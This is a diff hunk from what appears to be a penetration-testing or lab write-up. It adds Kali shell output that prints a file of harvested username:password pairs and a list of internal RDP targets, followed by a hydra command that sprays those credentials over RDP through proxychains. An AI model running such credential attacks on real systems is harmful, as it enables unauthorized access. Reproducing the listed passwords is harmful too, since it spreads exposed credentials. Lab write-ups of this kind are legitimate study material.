@@ -502,6 +502,17 @@ SMB         172.22.14.31    445    XR-ORACLE        [-] XR-ORACLE\zhangshuai:wSb
 
 ```
 ┌──(root㉿kali)-[~]
+└─# cat ./user_passwd.txt
+huangmin:8I5VZpg4Mf
+zhangrong:cHY716Zauf
+...
+
+┌──(root㉿kali)-[~]
+└─# cat ./targets.txt
+172.22.14.46:3389
+...
+
+┌──(root㉿kali)-[~]
 └─# proxychains4 -q hydra -C ./user_passwd.txt -M ./targets.txt rdp -f
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
